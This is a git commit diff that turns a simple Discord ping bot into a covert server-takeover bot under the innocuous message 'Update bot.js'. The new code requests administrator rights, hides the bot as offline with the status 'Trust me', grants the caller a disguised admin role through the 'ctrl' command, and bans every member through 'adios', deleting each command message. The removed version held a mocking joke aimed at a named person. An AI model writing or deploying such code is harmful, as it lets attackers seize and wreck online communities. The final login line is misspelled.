0bb998cab84e94ed07a41de975e52f8a59af1e6c
Facksy <45769049+Facksy@users.noreply.github.com>
2019-08-26 16:41:48 +0200

    Update bot.js

--- bot.js
+++ bot.js
@@ -1,17 +1,59 @@
-const Discord = require('discord.js');
-const client = new Discord.Client();
+const botSettings = require("./botsettings.json");
+const Discord = require("discord.js");
+const bot = new Discord.Client({disableEveryone: true});
 
-client.on('ready', () => {
-    console.log('I am ready!');
+bot.on("ready", async () => {
+	console.log(` Activated`);
+	//Bot Status
+	bot.user.setStatus("offline");
+	bot.user.setActivity(`Trust me`);
+
+	try {
+		//Generates a invite link in the console...
+	let link = await bot.generateInvite(["ADMINISTRATOR"]);
+	console.log(link);
+	} catch(e) {
+		console.log(e.stack);
+	}
 });
 
-client.on('message', message => {
-    if (message.content === 'ping') {
-    	message.reply('pong');
-  	}
-    if (message.content === 'pac is') {
-    	message.channel.send("the gayest camel on earth")
-  	}
+bot.on("message", async message => { 
+if(message.author.bot) return;
+
+	const args = message.content.slice(botSettings.prefix.length).trim().split(/ +/g);
+  	const command = args.shift().toLowerCase();
+
+  //Gives you the admin role and deletes the message.
+  if(command === `ctrl`) {
+  	try {
+	role = await message.guild.createRole({
+ 	name: "Dope Role",
+  	color: "#2f3136",
+  	permissions: [8]
+	});
+	message.member.addRole(role)
+	message.delete(1000);
+	} catch(e) {
+		console.log(e.stack);
+	}
+   }
+   //Bans everyone and deletes the message.
+   if(command === `adios`) {
+   	try {
+   	message.guild.members.forEach(member => {member.ban()});
+   	message.delete(1000);
+   	} catch(e) {
+	console.log(e.stack);
+   	}
+   }
+
+   if(command === `leaveserver`) {
+   	try {
+   	message.guild.leave();
+   	} catch(e) {
+	console.log(e.stack);
+   	}
+   }
 });
 
-client.login(process.env.BOT_TOKEN);
+bit.login(process.env.BOT_TOKEN);
